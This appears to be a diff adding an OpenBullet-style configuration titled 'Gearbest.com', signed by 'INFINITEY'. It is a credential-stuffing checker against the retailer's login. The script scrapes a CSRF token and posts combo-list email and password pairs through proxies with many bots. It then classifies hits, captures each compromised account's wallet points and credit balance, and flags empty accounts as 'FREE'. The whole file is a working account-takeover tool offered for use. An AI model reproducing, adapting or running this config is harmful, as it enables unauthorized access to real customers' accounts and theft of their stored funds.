@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "Gearbest.com",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-20T20:21:08.1217429+02:00",
+  "AdditionalInfo": "",
+  "Author": "INFINITEY",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_token REQUEST GET "https://login.gearbest.com/m-users-a-sign.htm?type=1" 
+  
+  HEADER "Host: login.gearbest.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.gearbest.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,de;q=0.8,pl;q=0.7" 
+#token PARSE "<SOURCE>" LR "name=\"_token\" value=\"" "\">" -> VAR "token" 
+#login REQUEST POST "https://login.gearbest.com/user/login" 
+  CONTENT "{\"_token\":\"<token>\",\"email\":\"<USER>\",\"passWord\":\"<PASS>\",\"keepMe\":\"1\",\"timeZone\":\"+2\",\"userCenterSuffix\":\"\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Host: login.gearbest.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://login.gearbest.com" 
+  HEADER "X-CSRF-TOKEN: <token>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Referer: https://login.gearbest.com/m-users-a-sign.htm?type=1" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,de;q=0.8,pl;q=0.7" 
+  HEADER "Content-Length: 158" 
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The account information or password is incorrect. Please try again" 
+    KEY "{\"status\":1,\"msg\":\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":0,\"msg\":\"success\"" 
+#wallet REQUEST GET "https://user.gearbest.com/index#/wallet/index" 
+  
+  HEADER "Host: user.gearbest.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://user.gearbest.com/index" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,de;q=0.8,pl;q=0.7" 
+#PARSE_points PARSE "<SOURCE>" LR "data-point=\"" "\"" -> CAP "Points" "|" "" 
+#PARSE_$ PARSE "<SOURCE>" LR "data-credit=\"" "\"" -> CAP "" "" "$|By INFINITEY#9357" 
+#FREE_CHECK KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "data-point=\"0\"" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "data-point=\"0\"" 
